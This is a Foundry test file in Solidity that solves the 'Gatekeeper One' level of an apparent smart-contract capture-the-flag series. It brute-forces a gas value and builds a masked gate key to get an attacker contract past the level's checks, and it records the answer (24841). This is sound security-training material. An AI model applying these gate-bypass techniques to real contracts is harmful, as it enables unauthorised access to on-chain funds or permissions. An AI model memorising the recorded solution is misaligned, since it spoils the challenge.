pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "src/13_Gatekeeper_One/Level.sol";
import "src/13_Gatekeeper_One/Attacker.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne level;
    Attacker attacker;

    function setUp() public {
        level = new GatekeeperOne();
        attacker = new Attacker(address(level));
    }

    /**
    Send transactions with different gas amounts until you find the correct one
     */
    function test_GateTwo() public {
        //First modify the Level contract and exclude the third gate
        //Then run this test to determine how much gas it takes to pass Gate Two

        bytes8 gatekey = 0x0000000000000000;

        for (uint i = 0; i < 8191; i++) {
            try level.enter{gas: 21000 + i}(gatekey) {
                console.log("Passed with gas ->", 21000 + i);
                //Result is 24841
                break;
            } catch {}
        }
    }

    /**
    The main attack
    to run, type in bash: forge test --match-test test_attack -vvv
     */
    function test_attack() public {
        uint256 _totalGas = 24841;


        //Use byte masking to make sure to pass the requirements of gate three
        bytes8 _gateKey = bytes8(uint64(uint160(address(msg.sender)))) &
            0xFFFFFFFF0000FFFF;

        attacker.attack(_totalGas, _gateKey);

        if (level.entrant() != msg.sender) {
            revert("Level failed. Did not pass all gates");
        }
    }
}
